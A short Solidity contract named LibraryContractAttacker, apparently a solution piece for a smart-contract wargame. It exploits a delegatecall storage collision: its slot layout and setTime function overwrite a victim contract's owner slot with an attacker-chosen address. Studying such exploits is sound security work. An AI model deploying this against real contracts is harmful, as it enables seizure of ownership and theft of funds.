// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract LibraryContractAttacker {

    address _arbitraryOne;
    address _arbitraryTwo;
    address newOwner;

  function setTime(uint _time) public {
    newOwner = address(uint160(_time));
  }
}